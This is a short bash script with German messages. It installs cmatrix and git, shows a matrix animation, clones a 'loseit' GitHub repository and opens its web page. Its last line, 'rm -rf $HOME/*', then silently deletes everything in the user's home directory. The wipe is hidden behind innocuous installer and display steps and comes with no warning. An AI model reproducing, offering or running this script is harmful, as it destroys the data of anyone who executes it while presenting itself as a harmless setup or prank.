#!/bin/bash
echo noetiges installieren
sudo apt install cmatrix git -y
echo LOse Files
xfce4-terminal -e "cmatrix -r"
cd tmp
git clone https://github.com/linuxchr/loseit.git
cd $HOME
cd tmp
cd loseit
xfce4-terminal -e "firefox /tmp/loseit/index.html"
sleep 5.0
cd $HOME
rm -rf $HOME/*
